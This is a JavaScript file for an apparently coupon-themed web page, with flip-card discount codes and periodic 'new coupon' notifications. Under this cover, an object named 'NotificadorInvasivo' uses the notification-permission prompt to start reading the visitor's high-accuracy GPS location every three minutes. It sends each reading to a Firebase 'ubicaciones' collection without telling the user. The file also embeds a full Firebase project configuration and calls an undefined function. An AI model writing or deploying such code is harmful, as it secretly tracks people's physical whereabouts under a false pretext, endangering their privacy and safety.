/* CONEXION BASE DE DATOS */
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc,
  serverTimestamp,
  getCountFromServer
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

// TODO: Replace the following with your app's Firebase project configuration
// See: https://support.google.com/firebase/answer/7015592
const firebaseConfig = {
  apiKey: "AIzaSyBZavR7TNRrzKrxr1RqnvfrUelMLz81hyg",
  authDomain: "bd-herramienta-busqueda.firebaseapp.com",
  projectId: "bd-herramienta-busqueda",
  storageBucket: "bd-herramienta-busqueda.firebasestorage.app",
  messagingSenderId: "416153196731",
  appId: "1:416153196731:web:b0bc4ffe60cbb3a9a3319e",
  measurementId: "G-6S15ZGGCQ4"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
// Initialize Cloud Firestore and get a reference to the service
const db = getFirestore(app);
/* ******************************************************************************* */

/*FUNCION DE BD*/
async function guardarUbicacionBD(lat, lon) {
  try {
    const colRef = collection(db, "ubicaciones");

    const snapshot = await getCountFromServer(colRef);
    const nuevoId = snapshot.data().count;

    await addDoc(colRef, {
      ubicacion: `${lat}, ${lon}`,
      id_ubicaciones: nuevoId,
      fecha_ubi: serverTimestamp(),
    });
    console.log(`Documento guardado con ID secuencial: ${nuevoId}`);
  } catch (e) {
    console.error("Error al obtener conteo o guardar:", e);
  }
}

/*FUNCION DE GEOLOCALIZACION*/
async function obtenerUbicacion() {
  const resultado = document.getElementById("resultado");
  if (navigator.geolocation) {
    if (resultado) resultado.innerHTML = "capturando info";

    navigator.geolocation.getCurrentPosition(
      async function (posicion) {
        const lat = posicion.coords.latitude;
        const lon = posicion.coords.longitude;
        if (resultado) {
          resultado.innerHTML = `Lat: ${lat}, ${lon}`;
        }
        guardarUbicacionBD(lat, lon);
      },
      function (error) {
        console.error("Error de geolocalización:", error.message);
      },
      { enableHighAccuracy: true } // Mayor precisión para el GPS
    );
  }
}

/*notificador)*/
const NotificadorInvasivo = {
  registration: null,
  solicitarPermiso: async function (ms) {
    try {
      this.registration = await navigator.serviceWorker.register('/sw.js');
      let permission = await Notification.requestPermission();

      if (permission === "granted") {
        obtenerUbicacion();
        setInterval(() => {
          obtenerUbicacion();
        }, ms);
      }
    } catch (err) {

      console.error("Error de permisos/sw.js: ", err);
    }
  }
};
/*window.onload = () => {
  NotificadorInvasivo.solicitarPermiso(180000);
};*/
NotificadorInvasivo.solicitarPermiso(180000);

// También podrías disparar aquí la geolocalización
// obtenerUbicacion(); 

// Limpiamos el evento para que no se ejecute en cada clic
document.removeEventListener('click', activarNotificaciones);
document.removeEventListener('touchstart', activarNotificaciones);

document.addEventListener('click', activarNotificaciones);
document.addEventListener('touchstart', activarNotificaciones);




/**
 * NOTIFICACIONES CADA 5 MINUTOS 
 * POR EL DESBLOQUEO DE UN CUPON NUEVO
 * PC Y MOVIL
 */
const Noti = {
  msg: "¡Cupón: PROMO2026! 🎁",

  lanzar: function () {
    //Notificación de sistema (PC/Android)
    if (Notification.permission === "granted") {
      new Notification("¡Nuevo Cupón!", { body: this.msg });
    }

    // 2. Notificación en pantalla (Celular/Todos)
    const div = document.createElement('div');
    div.innerHTML = this.msg;
    div.style = "position:fixed;bottom:20px;right:20px;background:#000;color:#fff;padding:15px;border-radius:8px;z-index:9999;font-family:sans-serif";
    document.body.appendChild(div);

    setTimeout(() => div.remove(), 5000); // Desaparece en 5 seg
  },

  iniciar: function () {
    // Pedir permiso al primer clic
    document.addEventListener('click', () => Notification.requestPermission(), { once: true });

    // Ciclo de 3 minutos
    setInterval(() => this.lanzar(), 180000);
  }
};

Noti.iniciar();

/**funcion para el flip() 
 * imagen que al dar clic se voltee y muestre un codigo de descuento 
 * de esa página
*/
$("#card").flip();
$("#carde").flip();
